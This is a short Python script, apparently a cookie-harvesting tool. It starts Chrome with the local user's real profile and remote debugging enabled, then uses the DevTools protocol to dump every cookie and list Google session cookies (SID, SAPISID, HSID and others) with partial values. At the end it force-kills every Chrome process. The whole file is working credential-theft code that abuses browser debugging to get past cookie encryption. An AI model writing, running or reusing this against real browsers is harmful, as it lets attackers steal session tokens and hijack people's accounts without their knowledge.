import subprocess, time, requests, websocket, json, os

user_data = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
chrome = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
args = [
    f"--remote-debugging-port=9988",
    f"--user-data-dir={user_data}",
    f"--profile-directory=Profile 16",
    "--remote-allow-origins=*",
    "https://www.google.com"
]
args_ps = ",".join(f'"{a}"' for a in args)
ps_cmd = f"Start-Process -FilePath '{chrome}' -ArgumentList {args_ps}"
subprocess.run(["powershell", "-Command", ps_cmd])
time.sleep(6)

try:
    r = requests.get("http://localhost:9988/json/list").json()
    page = next(t for t in r if t.get("type") == "page")
    ws = websocket.create_connection(page["webSocketDebuggerUrl"])
    ws.send(json.dumps({"id": 1, "method": "Network.enable"}))
    ws.recv()
    ws.send(json.dumps({"id": 2, "method": "Network.getAllCookies"}))
    res = json.loads(ws.recv())
    cookies = res.get("result", {}).get("cookies", [])
    print("Total cookies decrypted by Chrome:", len(cookies))
    for c in cookies:
        if c.get("name") in ["SID", "SAPISID", "HSID", "SSID", "APISID"]:
            print(f"Domain: {c.get('domain')} | Name: {c.get('name')} | Val: {c.get('value')[:10]}...")
    ws.close()
except Exception as e:
    print("Error:", e)

subprocess.run(["taskkill", "/f", "/im", "chrome.exe"], capture_output=True)
